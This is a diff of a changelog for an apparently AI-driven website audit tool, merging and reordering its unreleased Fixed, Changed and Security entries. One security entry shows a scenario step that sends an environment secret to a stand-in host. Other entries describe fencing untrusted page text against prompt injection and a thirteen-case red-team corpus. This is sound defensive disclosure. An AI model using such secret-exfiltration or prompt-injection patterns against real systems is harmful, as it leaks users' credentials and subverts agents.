@@ -7,39 +7,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
-### Fixed
-- A run that covered less of its matrix than planned now says so. Units skipped
-  because the budget cap tripped, or dropped because their persona was missing,
-  return without pushing a result — so `summary.total` is the executed count,
-  not the planned one, and nothing compared the two.
-
-  Measured: a three-unit matrix with `--budget 0.02 -j 1` logged two "unit
-  skipped" events and reported `total: 1`, `PASS 0 WARN 0 FAIL 1`. That is
-  indistinguishable from a one-unit matrix that ran to completion — and had the
-  single unit passed, it would have read as a clean audit of all three.
-
-- `--budget` is described as what it is. It read "Max USD budget"; the check
-  runs after a unit finishes and only stops units that have not started, so
-  spend can exceed it by up to one concurrent batch. With concurrency at or
-  above the matrix size it does not constrain the run at all: a $0.02 budget on
-  a three-unit matrix at `-j 3` spent $0.074.
-
-### Fixed
-- `explore` no longer writes its internal LLM traffic to stdout. Stagehand's
-  logging now goes through this project's structured logger, which writes to
-  stderr, matching what `run` already did.
-
-  `disablePino: true` had left Stagehand on a console.log-based logger, and
-  console.log is stdout. A real run produced 92 lines there — accessibility-tree
-  dumps, raw response objects, token counts — around a six-line summary, against
-  4 lines of stderr. Redirecting to a file captured the noise and buried the
-  result. The same run now produces 9 lines of stdout and no response objects.
-
-  The detail is not lost: it goes to debug level, and to `LOG_FILE` if set.
-  Only Stagehand's own error level is promoted to warn, so an ordinary audit
-  stops looking alarming.
-
 ### Added
+
 - `npm run compare:critics` reports what critic models actually score, dimension
   by dimension, across repeated trials.
 
@@ -65,199 +34,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   measure was never applied, and it imported `HistoryEntry` from a module that
   does not export it.
 
-### Fixed
-- The accessibility gate no longer casts away the argument types it passes to
-  `renderTrendsHtml`, which was hiding the same misuse.
-
-### Fixed
-- The PDF report declares the language it is written in. `<html lang="en">` was
-  hardcoded for every locale, so a Japanese or Chinese report announced itself
-  as English — which both font selection and assistive technology read.
-
-- The PDF font stack names faces that can render the script. It was
-  `-apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif` for
-  all five locales, with no CJK entry at all; somewhere with no CJK fonts
-  installed, which is the normal state of a Linux CI container, the zh-CN and
-  ja reports are boxes. Japanese and Chinese get separate stacks, because one
-  combined list renders each in the other's face wherever both are installed.
-  The running header repeats the stack, since Chromium renders header and
-  footer templates outside the page stylesheet and the header carries a
-  translated title.
-
-  Stated because it was measured and is not what one would assume: this does
-  **not** change which glyphs macOS produces. Chromium's PDF backend still
-  substitutes STSongti-SC — a Simplified Chinese face — for Japanese text on
-  this platform whatever the stylesheet asks for. The stack matters where the
-  named faces resolve; the `lang` attribute is correct everywhere.
-
-### Fixed
-- A run where the AI never reached the model no longer reports a near-clean
-  verdict. With the API unreachable, the vision step failed, each step was
-  recorded as a warning, and the summary read
-  `PASS 0  WARN 3  FAIL 0  (0 critical issues)` with exit code 2 — "passed with
-  warnings", which lets CI move on. Nothing had been looked at.
-
-  That is worse than the disk-full and missing-browser cases, which at least
-  look bad; this one looks like good news. The recorded data was already
-  correct — `scores: []`, `overall_score: 0` — only the summary's reading of it
-  was wrong.
-
-  Units that produced no scores are now named as unevaluated, with the
-  underlying error, and a run where nothing at all was evaluated exits 1 rather
-  than 2. A low score is still a score: genuinely bad results remain verdicts.
-
-### Fixed
-- A report that cannot be written no longer discards the audit. On a full disk
-  `writeJsonReport` threw and the process died with a bare
-  `[FATAL] ENOSPC: no space left on device` — after fifty seconds of browser
-  launches and LLM calls, with real money spent. The user saw no verdict, no
-  counts and no cost, only a raw filesystem error.
-
-  Measured on a three-unit matrix pointed at a 2 MB volume: $0.067 spent and
-  nothing to show for it. The PDF writer had worked correctly all along, with a
-  comment saying the audit remains complete when it fails; the other five did
-  not follow it.
-
-  The counts and cost now print first, then the list of reports that could not
-  be written and why. A run whose artefacts never reached disk exits non-zero
-  even when every scenario passed, so CI cannot read "nothing was written" as
-  "everything is fine".
-
-### Fixed
-- A run that fails because this machine is broken no longer reads as a verdict
-  about the audited site. With the browser missing, every unit failed at launch
-  and the summary said `FAIL 3 (3 critical issues), Cost: $0.000` — which sends
-  the reader to look at their website. The real cause reached the JSON report
-  ("Executable doesn't exist at ...") but nobody reads that first, and `$0.000`
-  was the only thing on screen suggesting nothing had been audited at all.
-
-  Both `run` and `explore` now name the environment failure and point at
-  `pixelcheck install` / `doctor --fix`, which the product ships for exactly
-  this case and neither summary mentioned.
-
-- A missing browser executable is treated as terminal rather than retried. The
-  earlier classifier covered a browser that had been alive and closed and
-  missed one that was never there — no amount of retrying installs it. Measured
-  on a three-unit matrix with the browser made unavailable: 11s before, 1s
-  after.
-
-### Security
-- `redact_patterns` given as a prefix now removes the whole credential rather
-  than just the prefix. The config `init` scaffolds for every new project sets
-  prefixes — `sk-ant-`, `pk_test_`, `pk_live_` — and a plain substring replace
-  turned `sk-ant-api03-REALKEY` into `[REDACTED]api03-REALKEY`.
-
-  That is worse than leaving it alone. The entropy survives intact while the
-  marker a secret scanner greps for is gone, so the leak stops being detectable
-  without becoming any less usable: anyone who finds it knows exactly what to
-  put back on the front. It applies to any credential visible on an audited
-  page, which reports and CI artefacts then carry.
-
-  Redaction had tested clean throughout because the tests and the product used
-  different configurations. `tests/ci-reporters.test.ts` sets
-  `redact_patterns: ["sk-ant-secret-9999"]` — the complete value — so the
-  substring replace removed all of it. The suite never exercised the prefixes
-  the product ships.
-
-  A match now also consumes the trailing run of token characters. Whole-value
-  patterns, which is what the environment-variable path adds, are unchanged.
-
-  **Behaviour change**: redaction is greedier. A pattern that opens a longer
-  token now takes the rest of that token with it — `redact("a-secret-a", ["a"])`
-  returns `[REDACTED]` where it used to return `[REDACTED]-secret-[REDACTED]`.
-  That is the safe direction for something whose job is to not leak, and real
-  patterns are whole secrets or scheme prefixes rather than single letters.
-
-### Fixed
-- `history` and `trends` accept a project directory as well as a project name,
-  and say something useful when a filter matches nothing. `run` and `init` take
-  `--project <dir>`; these two took `--project <name>`. Each was documented
-  correctly on its own, which is exactly why the mismatch was easy to walk into:
-  the obvious command after `pixelcheck run --project projects/demo` is
-  `pixelcheck history --project projects/demo`, and that printed "No audit
-  history found" with seven runs in the database. `trends` was worse — it wrote
-  a dashboard reading "0 runs", an artefact that looks finished.
-
-  A filter matching nothing now names the projects that do exist, so an empty
-  result is distinguishable from having no data.
-
-- `diff` accepts run directories as well as run ids, and lists recent ids when
-  neither is found. Every completed audit prints absolute report paths, so a
-  path is what the user has; the id is that directory's basename, which made
-  the two needlessly non-interchangeable.
-
-### Fixed
-- `doctor` reported the wrong minimum Node version. It accepted Node 18 and
-  printed "(>= 18 required)" while `engines.node` has said `>=20.0.0` since the
-  toolchain moved past 18 — so the check whose entire job is to answer "will
-  this machine run it" answered yes on a runtime the package does not support
-  and CI does not test. A user on 18 got a green line and then failures with no
-  connection to it.
-
-  The drift was invisible to every other gate: both numbers were internally
-  consistent, so nothing failed. A contract test now pins `doctor`'s floor to
-  `engines.node`.
-
-### Fixed
-- The retry policy no longer retries failures that cannot succeed. A full disk,
-  a browser that has closed, a read-only filesystem, a permission error or a
-  rejected API key now abort on the first attempt instead of being re-run with
-  exponential backoff.
-
-  `retryableErrors` is an allow-list, it defaults to empty, and nothing in this
-  repository has ever set it — so every error except `BudgetExceededError` and
-  `ConsentDeclinedError` was retried. The one production call site wraps a
-  whole step: navigate, screenshot, LLM call. A dead browser therefore re-ran
-  that entire cascade, twice, with backoff, to fail the same way and take
-  longer doing it. On a full disk each attempt also wrote more, so retrying
-  made the condition worse rather than merely wasting time.
-
-  The comment at that call site already observed that re-running the cascade
-  multiplies spend — which is why `act` was capped at zero outer retries. Every
-  other step type still paid.
-
-  Transient failures are unaffected and are tested as explicitly as the
-  terminal ones: connection resets, upstream 503s, navigation timeouts and
-  missing elements still get their retries. Programming errors are deliberately
-  left retryable — retrying one is close to useless, but a library can surface
-  a genuinely transient failure as a `TypeError`, and losing a retry that would
-  have worked is the worse trade.
-
-  The abort log now names which terminal condition fired.
-
-### Changed
-- The accessibility gate now covers every HTML report this project produces —
-  the audit report and the SPA explorer as well as the trends dashboard. It had
-  covered one of three, recording the other two as needing "a completed run" to
-  render. That was an assumption nobody had checked: `writeHtmlReport` and
-  `writeSpaReport` take a plain `AuditRun` and a directory, as their own unit
-  tests already showed, so a fixture is enough. Recording a limitation without
-  testing it is how a gate quietly covers a third of what it appears to.
-
-  All three are clean, and the two newly covered ones were confirmed to fail
-  when low-contrast text is planted in them.
-
-  What it still does not cover, stated in the script: axe sees the DOM as
-  rendered. The SPA's filters and expandable rows are never entered, and no
-  report is checked after a theme toggle.
-
-### Fixed
-- Three log-reading tests flush the logger before reading it instead of
-  sleeping and hoping. `result-schema.test.ts` failed on a Windows runner with
-  `expected '' to match /result schema mismatch/` — it slept 200ms for pino to
-  reach disk, which is a guess at a duration, and the file was still empty.
-
-  The fix was already present in the same file: `_closeLoggerStreamsForTests()`
-  waits for the descriptor and carries a comment saying SonicBoom's `end()` is
-  async on Windows. It was being called after the read rather than before it.
-  Both cases here and the three in `logger.test.ts` now flush first.
-
-  Honest about verification: this one could not be red-verified locally. The
-  machine flushes within a millisecond, so a shortened sleep still passes —
-  the same reason the defect only ever appeared on CI. The justification is the
-  mechanism and the CI failure, not a local reproduction.
-
-### Added
 - The untrusted-content fence now has a number attached to it. A red-team
   corpus of thirteen cases — organised by technique rather than by volume —
   runs through the navigator and reports an attack-success-rate:
@@ -284,7 +60,31 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   request: the result depends on a model, so it would fail the gate for reasons
   unrelated to the change under review.
 
+- The release workflow inspects the packed tarball before publishing: it fails
+  on internal project-tracking identifiers and on any source map. `1.4.4`
+  shipped identifiers in a `.d.ts` file, in a string literal and in
+  `SECURITY.md`; `lint:no-internal-refs` now covers the source, but it scans
+  the repository rather than the artefact, and the artefact is what consumers
+  receive. `CHANGELOG.md` is excluded, matching the repository gate — a
+  historical record edited afterwards to look tidier is one nobody can trust.
+
 ### Changed
+
+- The accessibility gate now covers every HTML report this project produces —
+  the audit report and the SPA explorer as well as the trends dashboard. It had
+  covered one of three, recording the other two as needing "a completed run" to
+  render. That was an assumption nobody had checked: `writeHtmlReport` and
+  `writeSpaReport` take a plain `AuditRun` and a directory, as their own unit
+  tests already showed, so a fixture is enough. Recording a limitation without
+  testing it is how a gate quietly covers a third of what it appears to.
+
+  All three are clean, and the two newly covered ones were confirmed to fail
+  when low-contrast text is planted in them.
+
+  What it still does not cover, stated in the script: axe sees the DOM as
+  rendered. The SPA's filters and expandable rows are never entered, and no
+  report is checked after a theme toggle.
+
 - The release rehearsal publishes a dry run under a version that does not
   exist yet. Its first run failed with "You cannot publish over the previously
   published versions: 1.4.4" — `npm publish --dry-run` reaches the registry, so
@@ -317,16 +117,224 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   the other eight workflows were bumped, precisely because nothing could
   verify it before a release.
 
-### Added
-- The release workflow inspects the packed tarball before publishing: it fails
-  on internal project-tracking identifiers and on any source map. `1.4.4`
-  shipped identifiers in a `.d.ts` file, in a string literal and in
-  `SECURITY.md`; `lint:no-internal-refs` now covers the source, but it scans
-  the repository rather than the artefact, and the artefact is what consumers
-  receive. `CHANGELOG.md` is excluded, matching the repository gate — a
-  historical record edited afterwards to look tidier is one nobody can trust.
+- `actions/checkout` and `actions/setup-node` move to v7 in the eight workflows
+  that pull-request CI actually runs. `setup-node@v7` stops exporting a dummy
+  `NODE_AUTH_TOKEN`, which matters here now that publishing is OIDC-only and
+  no token exists to fall back on. Neither v7 major affects this repository:
+  `checkout`'s breaking change blocks fork checkouts under `pull_request_target`
+  and `workflow_run`, and neither trigger is used.
+
+  `release.yml` deliberately stays on v6. It runs only on a tag, so no pull
+  request can exercise it, and the next publish is a security patch with no
+  token fallback — an unverifiable change does not belong in it. Publishing
+  already works on v6, so the benefit is theoretical and can wait for its own
+  change.
+
+- Every declined dependency major is now written into `dependabot.yml` with the
+  condition that would change the answer. Closing a Dependabot PR for a single
+  dependency is not neutral: the bot suppresses that version until the next one
+  ships. Nine had been closed that way, so the backlog was invisible to the
+  automation and had to be rediscovered with `npm outdated`. A refusal held
+  only in the bot's memory is a refusal nobody can review.
+
+- `better-sqlite3` is pinned to `~12.9.0`. From 12.10.0 the project stopped
+  publishing prebuilt binaries for Node 20 (ABI 115) on every platform, so
+  installs on the oldest Node this package supports fall back to compiling from
+  source — which succeeds where a toolchain exists and fails outright on
+  Windows, where there is no MSVC by default. `engines.node` says `>=20` and
+  `os` lists `win32`; honouring both means staying on the last release that
+  ships those binaries.
+- Dependency refresh within the existing SemVer ranges. Notably Stagehand
+  3.3.0 → 3.7.1, Playwright 1.59.1 → 1.62.0 and axe-core 4.11.4 → 4.12.1. Both browser-driving suites pass against the
+  new versions, which is what matters here: axe-core governs every
+  accessibility finding this tool reports, and a rule-set change would show up
+  as different violations on the deliberately broken fixture page.
+
+  Note for contributors: the Playwright bump needs
+  `npx playwright install chromium chromium-headless-shell`. The pinned browser
+  revision changed, and without it every browser test fails with "Executable
+  doesn't exist" — an environment error that reads like a code regression.
+
+  The 17 low advisories in the production tree are unchanged and remain
+  disclosed in `SECURITY.md`. They all trace to `@ai-sdk/provider-utils`, which
+  Stagehand pulls transitively. The fix exists only in that package's 4.x and
+  5.x lines while the whole `@ai-sdk` family depends on `^3`, so clearing it
+  would mean forcing a major version onto a transitive dependency that nothing
+  in that ecosystem has tested — a larger risk than a low-severity resource
+  exhaustion in a provider path this project does not call.
 
 ### Fixed
+
+- A run that covered less of its matrix than planned now says so. Units skipped
+  because the budget cap tripped, or dropped because their persona was missing,
+  return without pushing a result — so `summary.total` is the executed count,
+  not the planned one, and nothing compared the two.
+
+  Measured: a three-unit matrix with `--budget 0.02 -j 1` logged two "unit
+  skipped" events and reported `total: 1`, `PASS 0 WARN 0 FAIL 1`. That is
+  indistinguishable from a one-unit matrix that ran to completion — and had the
+  single unit passed, it would have read as a clean audit of all three.
+
+- `--budget` is described as what it is. It read "Max USD budget"; the check
+  runs after a unit finishes and only stops units that have not started, so
+  spend can exceed it by up to one concurrent batch. With concurrency at or
+  above the matrix size it does not constrain the run at all: a $0.02 budget on
+  a three-unit matrix at `-j 3` spent $0.074.
+
+- `explore` no longer writes its internal LLM traffic to stdout. Stagehand's
+  logging now goes through this project's structured logger, which writes to
+  stderr, matching what `run` already did.
+
+  `disablePino: true` had left Stagehand on a console.log-based logger, and
+  console.log is stdout. A real run produced 92 lines there — accessibility-tree
+  dumps, raw response objects, token counts — around a six-line summary, against
+  4 lines of stderr. Redirecting to a file captured the noise and buried the
+  result. The same run now produces 9 lines of stdout and no response objects.
+
+  The detail is not lost: it goes to debug level, and to `LOG_FILE` if set.
+  Only Stagehand's own error level is promoted to warn, so an ordinary audit
+  stops looking alarming.
+
+- The accessibility gate no longer casts away the argument types it passes to
+  `renderTrendsHtml`, which was hiding the same misuse.
+
+- The PDF report declares the language it is written in. `<html lang="en">` was
+  hardcoded for every locale, so a Japanese or Chinese report announced itself
+  as English — which both font selection and assistive technology read.
+
+- The PDF font stack names faces that can render the script. It was
+  `-apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif` for
+  all five locales, with no CJK entry at all; somewhere with no CJK fonts
+  installed, which is the normal state of a Linux CI container, the zh-CN and
+  ja reports are boxes. Japanese and Chinese get separate stacks, because one
+  combined list renders each in the other's face wherever both are installed.
+  The running header repeats the stack, since Chromium renders header and
+  footer templates outside the page stylesheet and the header carries a
+  translated title.
+
+  Stated because it was measured and is not what one would assume: this does
+  **not** change which glyphs macOS produces. Chromium's PDF backend still
+  substitutes STSongti-SC — a Simplified Chinese face — for Japanese text on
+  this platform whatever the stylesheet asks for. The stack matters where the
+  named faces resolve; the `lang` attribute is correct everywhere.
+
+- A run where the AI never reached the model no longer reports a near-clean
+  verdict. With the API unreachable, the vision step failed, each step was
+  recorded as a warning, and the summary read
+  `PASS 0  WARN 3  FAIL 0  (0 critical issues)` with exit code 2 — "passed with
+  warnings", which lets CI move on. Nothing had been looked at.
+
+  That is worse than the disk-full and missing-browser cases, which at least
+  look bad; this one looks like good news. The recorded data was already
+  correct — `scores: []`, `overall_score: 0` — only the summary's reading of it
+  was wrong.
+
+  Units that produced no scores are now named as unevaluated, with the
+  underlying error, and a run where nothing at all was evaluated exits 1 rather
+  than 2. A low score is still a score: genuinely bad results remain verdicts.
+
+- A report that cannot be written no longer discards the audit. On a full disk
+  `writeJsonReport` threw and the process died with a bare
+  `[FATAL] ENOSPC: no space left on device` — after fifty seconds of browser
+  launches and LLM calls, with real money spent. The user saw no verdict, no
+  counts and no cost, only a raw filesystem error.
+
+  Measured on a three-unit matrix pointed at a 2 MB volume: $0.067 spent and
+  nothing to show for it. The PDF writer had worked correctly all along, with a
+  comment saying the audit remains complete when it fails; the other five did
+  not follow it.
+
+  The counts and cost now print first, then the list of reports that could not
+  be written and why. A run whose artefacts never reached disk exits non-zero
+  even when every scenario passed, so CI cannot read "nothing was written" as
+  "everything is fine".
+
+- A run that fails because this machine is broken no longer reads as a verdict
+  about the audited site. With the browser missing, every unit failed at launch
+  and the summary said `FAIL 3 (3 critical issues), Cost: $0.000` — which sends
+  the reader to look at their website. The real cause reached the JSON report
+  ("Executable doesn't exist at ...") but nobody reads that first, and `$0.000`
+  was the only thing on screen suggesting nothing had been audited at all.
+
+  Both `run` and `explore` now name the environment failure and point at
+  `pixelcheck install` / `doctor --fix`, which the product ships for exactly
+  this case and neither summary mentioned.
+
+- A missing browser executable is treated as terminal rather than retried. The
+  earlier classifier covered a browser that had been alive and closed and
+  missed one that was never there — no amount of retrying installs it. Measured
+  on a three-unit matrix with the browser made unavailable: 11s before, 1s
+  after.
+
+- `history` and `trends` accept a project directory as well as a project name,
+  and say something useful when a filter matches nothing. `run` and `init` take
+  `--project <dir>`; these two took `--project <name>`. Each was documented
+  correctly on its own, which is exactly why the mismatch was easy to walk into:
+  the obvious command after `pixelcheck run --project projects/demo` is
+  `pixelcheck history --project projects/demo`, and that printed "No audit
+  history found" with seven runs in the database. `trends` was worse — it wrote
+  a dashboard reading "0 runs", an artefact that looks finished.
+
+  A filter matching nothing now names the projects that do exist, so an empty
+  result is distinguishable from having no data.
+
+- `diff` accepts run directories as well as run ids, and lists recent ids when
+  neither is found. Every completed audit prints absolute report paths, so a
+  path is what the user has; the id is that directory's basename, which made
+  the two needlessly non-interchangeable.
+
+- `doctor` reported the wrong minimum Node version. It accepted Node 18 and
+  printed "(>= 18 required)" while `engines.node` has said `>=20.0.0` since the
+  toolchain moved past 18 — so the check whose entire job is to answer "will
+  this machine run it" answered yes on a runtime the package does not support
+  and CI does not test. A user on 18 got a green line and then failures with no
+  connection to it.
+
+  The drift was invisible to every other gate: both numbers were internally
+  consistent, so nothing failed. A contract test now pins `doctor`'s floor to
+  `engines.node`.
+
+- The retry policy no longer retries failures that cannot succeed. A full disk,
+  a browser that has closed, a read-only filesystem, a permission error or a
+  rejected API key now abort on the first attempt instead of being re-run with
+  exponential backoff.
+
+  `retryableErrors` is an allow-list, it defaults to empty, and nothing in this
+  repository has ever set it — so every error except `BudgetExceededError` and
+  `ConsentDeclinedError` was retried. The one production call site wraps a
+  whole step: navigate, screenshot, LLM call. A dead browser therefore re-ran
+  that entire cascade, twice, with backoff, to fail the same way and take
+  longer doing it. On a full disk each attempt also wrote more, so retrying
+  made the condition worse rather than merely wasting time.
+
+  The comment at that call site already observed that re-running the cascade
+  multiplies spend — which is why `act` was capped at zero outer retries. Every
+  other step type still paid.
+
+  Transient failures are unaffected and are tested as explicitly as the
+  terminal ones: connection resets, upstream 503s, navigation timeouts and
+  missing elements still get their retries. Programming errors are deliberately
+  left retryable — retrying one is close to useless, but a library can surface
+  a genuinely transient failure as a `TypeError`, and losing a retry that would
+  have worked is the worse trade.
+
+  The abort log now names which terminal condition fired.
+
+- Three log-reading tests flush the logger before reading it instead of
+  sleeping and hoping. `result-schema.test.ts` failed on a Windows runner with
+  `expected '' to match /result schema mismatch/` — it slept 200ms for pino to
+  reach disk, which is a guess at a duration, and the file was still empty.
+
+  The fix was already present in the same file: `_closeLoggerStreamsForTests()`
+  waits for the descriptor and carries a comment saying SonicBoom's `end()` is
+  async on Windows. It was being called after the read rather than before it.
+  Both cases here and the three in `logger.test.ts` now flush first.
+
+  Honest about verification: this one could not be red-verified locally. The
+  machine flushes within a millisecond, so a shortened sleep still passes —
+  the same reason the defect only ever appeared on CI. The justification is the
+  mechanism and the CI failure, not a local reproduction.
+
 - `SessionStore.close()` now resolves once the file descriptor is released
   rather than once the data is flushed. `stream.end(cb)` fires its callback on
   "finish", when the write has reached the OS but the descriptor is still open
@@ -362,28 +370,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   in two MCP tests — did not appear once, and has been replaced with the
   measurement and an explicit exit condition.
 
-### Changed
-- `actions/checkout` and `actions/setup-node` move to v7 in the eight workflows
-  that pull-request CI actually runs. `setup-node@v7` stops exporting a dummy
-  `NODE_AUTH_TOKEN`, which matters here now that publishing is OIDC-only and
-  no token exists to fall back on. Neither v7 major affects this repository:
-  `checkout`'s breaking change blocks fork checkouts under `pull_request_target`
-  and `workflow_run`, and neither trigger is used.
-
-  `release.yml` deliberately stays on v6. It runs only on a tag, so no pull
-  request can exercise it, and the next publish is a security patch with no
-  token fallback — an unverifiable change does not belong in it. Publishing
-  already works on v6, so the benefit is theoretical and can wait for its own
-  change.
-
-- Every declined dependency major is now written into `dependabot.yml` with the
-  condition that would change the answer. Closing a Dependabot PR for a single
-  dependency is not neutral: the bot suppresses that version until the next one
-  ships. Nine had been closed that way, so the backlog was invisible to the
-  automation and had to be rediscovered with `npm outdated`. A refusal held
-  only in the bot's memory is a refusal nobody can review.
-
-### Fixed
 - `estimateCost` now says so when a model has no published price. The table
   covers three model ids; the API offers more, and picking a current model
   silently billed the estimate at the highest known rate, tripping budget
@@ -393,7 +379,80 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   calibration fixtures reported $0.09 on a priced model and $0.47 on an
   unpriced one, a gap that was entirely this fallback.
 
+- The reports this tool generates now pass the accessibility engine this tool
+  ships. Scanning the trends dashboard with its own axe-core returned one
+  serious violation — `#888` text on the `#fafafa` page background, 3.40:1
+  against a 4.5:1 requirement — alongside nine passing checks. The greys are
+  now `#666`, a value already used elsewhere in the same palette.
+
+  `npm run lint:report-a11y` renders the report and scans it on every
+  Playwright integration run, so this is now enforced rather than noticed.
+
+- Documentation that no longer described the software. `doctor` was listed as
+  "coming in v1.0" while shipping since then; `DEPRECATION-POLICY.md` pointed
+  at a module that does not exist; the CI matrix was still described as running
+  `macos-13`, replaced in 1.4.3; `SECURITY.md` claimed the audit gate runs at
+  `--audit-level=high` when it runs at `moderate`, and left a `TBD` where the
+  1.x support window should be.
+- The installation guide recommended Node 20, which reached end-of-life on
+  2026-04-30. It now recommends 22.x or 24.x and says why. Node 20 is still
+  accepted by `engines`; that is a separate decision.
+
+- `doctor`'s Chromium check now honours `PLAYWRIGHT_BROWSERS_PATH`. Playwright
+  resolves and caches `chromium.executablePath()` at first use, so a value set
+  later in the process was ignored — and relocating the browser cache is
+  Playwright's documented mechanism, which this project's own air-gapped
+  install guide tells people to use. The check therefore reported on a
+  directory the audit would never launch from, and disagreed with the
+  headless-shell check beside it, which already resolved through the same root.
+
 ### Security
+
+- A scenario that reads the environment now says which variables it read.
+  `${env.X}` resolves against the whole of `process.env` with no allowlist, and
+  the result can land in a URL, an `act` instruction, an email assertion or a
+  `computer_use` task — so a scenario can send any variable this process can
+  read to a host it names.
+
+  Measured: a step declaring `visit https://example.test/?k=${env.PROBE_SECRET}`
+  resolved to `https://example.test/?k=s3cr3t-value-123`.
+
+  That is a fair capability for a file you wrote. Scenario files are also the
+  kind of artefact people copy — from a team repository, a template, an example
+  bundle. Narrowing what `${env.*}` can reach would break existing scenarios and
+  is not attempted here; a scenario can still exfiltrate by naming a host. What
+  changes is that it can no longer do so silently: the variables read are logged
+  by name, and their values join the redaction patterns so they do not also
+  survive into the reports. Only nine specific keys were auto-redacted before,
+  and `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN` and `DATABASE_URL` are not among
+  them.
+
+- `redact_patterns` given as a prefix now removes the whole credential rather
+  than just the prefix. The config `init` scaffolds for every new project sets
+  prefixes — `sk-ant-`, `pk_test_`, `pk_live_` — and a plain substring replace
+  turned `sk-ant-api03-REALKEY` into `[REDACTED]api03-REALKEY`.
+
+  That is worse than leaving it alone. The entropy survives intact while the
+  marker a secret scanner greps for is gone, so the leak stops being detectable
+  without becoming any less usable: anyone who finds it knows exactly what to
+  put back on the front. It applies to any credential visible on an audited
+  page, which reports and CI artefacts then carry.
+
+  Redaction had tested clean throughout because the tests and the product used
+  different configurations. `tests/ci-reporters.test.ts` sets
+  `redact_patterns: ["sk-ant-secret-9999"]` — the complete value — so the
+  substring replace removed all of it. The suite never exercised the prefixes
+  the product ships.
+
+  A match now also consumes the trailing run of token characters. Whole-value
+  patterns, which is what the environment-variable path adds, are unchanged.
+
+  **Behaviour change**: redaction is greedier. A pattern that opens a longer
+  token now takes the rest of that token with it — `redact("a-secret-a", ["a"])`
+  returns `[REDACTED]` where it used to return `[REDACTED]-secret-[REDACTED]`.
+  That is the safe direction for something whose job is to not leak, and real
+  patterns are whole secrets or scheme prefixes rather than single letters.
+
 - Page-derived text no longer reaches a model prompt undelimited. Every agent
   prompt carries a DOM summary of the page under audit; that page is chosen by
   the user but written by someone else, and the summary includes `aria-label`
@@ -415,17 +474,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   Applied at all three sites that embed a DOM summary: the navigator and both
   planner paths.
 
-### Fixed
-- The reports this tool generates now pass the accessibility engine this tool
-  ships. Scanning the trends dashboard with its own axe-core returned one
-  serious violation — `#888` text on the `#fafafa` page background, 3.40:1
-  against a 4.5:1 requirement — alongside nine passing checks. The greys are
-  now `#666`, a value already used elsewhere in the same palette.
-
-  `npm run lint:report-a11y` renders the report and scans it on every
-  Playwright integration run, so this is now enforced rather than noticed.
-
-### Security
 - Internal project-tracking identifiers no longer ship in the published
   package, and the gate that was supposed to prevent that now matches the
   identifiers this repository actually uses.
@@ -443,53 +491,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   each other. 267 references were removed across 109 files. Release records,
   the changelog and ADRs are exempt: a log that is edited afterwards to look
   tidier is a log nobody can trust.
-
-### Fixed
-- Documentation that no longer described the software. `doctor` was listed as
-  "coming in v1.0" while shipping since then; `DEPRECATION-POLICY.md` pointed
-  at a module that does not exist; the CI matrix was still described as running
-  `macos-13`, replaced in 1.4.3; `SECURITY.md` claimed the audit gate runs at
-  `--audit-level=high` when it runs at `moderate`, and left a `TBD` where the
-  1.x support window should be.
-- The installation guide recommended Node 20, which reached end-of-life on
-  2026-04-30. It now recommends 22.x or 24.x and says why. Node 20 is still
-  accepted by `engines`; that is a separate decision.
-
-### Fixed
-- `doctor`'s Chromium check now honours `PLAYWRIGHT_BROWSERS_PATH`. Playwright
-  resolves and caches `chromium.executablePath()` at first use, so a value set
-  later in the process was ignored — and relocating the browser cache is
-  Playwright's documented mechanism, which this project's own air-gapped
-  install guide tells people to use. The check therefore reported on a
-  directory the audit would never launch from, and disagreed with the
-  headless-shell check beside it, which already resolved through the same root.
-
-### Changed
-- `better-sqlite3` is pinned to `~12.9.0`. From 12.10.0 the project stopped
-  publishing prebuilt binaries for Node 20 (ABI 115) on every platform, so
-  installs on the oldest Node this package supports fall back to compiling from
-  source — which succeeds where a toolchain exists and fails outright on
-  Windows, where there is no MSVC by default. `engines.node` says `>=20` and
-  `os` lists `win32`; honouring both means staying on the last release that
-  ships those binaries.
-- Dependency refresh within the existing SemVer ranges. Notably Stagehand
-  3.3.0 → 3.7.1, Playwright 1.59.1 → 1.62.0 and axe-core 4.11.4 → 4.12.1. Both browser-driving suites pass against the
-  new versions, which is what matters here: axe-core governs every
-  accessibility finding this tool reports, and a rule-set change would show up
-  as different violations on the deliberately broken fixture page.
-
-  Note for contributors: the Playwright bump needs
-  `npx playwright install chromium chromium-headless-shell`. The pinned browser
-  revision changed, and without it every browser test fails with "Executable
-  doesn't exist" — an environment error that reads like a code regression.
-
-  The 17 low advisories in the production tree are unchanged and remain
-  disclosed in `SECURITY.md`. They all trace to `@ai-sdk/provider-utils`, which
-  Stagehand pulls transitively. The fix exists only in that package's 4.x and
-  5.x lines while the whole `@ai-sdk` family depends on `^3`, so clearing it
-  would mean forcing a major version onto a transitive dependency that nothing
-  in that ecosystem has tested — a larger risk than a low-severity resource
-  exhaustion in a provider path this project does not call.
 
 ## [1.4.4] - 2026-07-28 — first release authenticated by trusted publishing
 
